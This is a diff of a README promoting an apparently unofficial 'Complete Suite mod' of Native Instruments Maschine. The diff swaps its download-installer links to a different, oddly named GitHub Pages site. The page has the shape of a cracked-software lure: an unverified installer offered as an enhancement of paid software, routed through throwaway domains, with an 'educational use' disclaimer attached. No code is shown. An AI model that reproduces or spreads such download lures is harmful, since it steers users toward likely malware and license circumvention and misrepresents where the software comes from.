@@ -2,7 +2,7 @@
 
 Native Instruments Maschine is a premier beatmaking and music production platform used by creators worldwide. This 2026 Complete Suite mod enhances your Maschine experience with expanded sound libraries, advanced customization tools, and optimized performance for Windows 10/11 systems. Whether you're crafting beats in a studio or live setting, this toolkit elevates your workflow with additional features and seamless integration.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## About This Tool
 
@@ -64,7 +64,7 @@ A: You can find troubleshooting tips and community forums on the download page. 
 
 To access the latest version of Native Instruments Maschine 2026 Complete Suite, including updates and additional resources, visit our official download page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Note: This tool is intended for educational and personal use. Always respect software licenses and terms of service.*
 
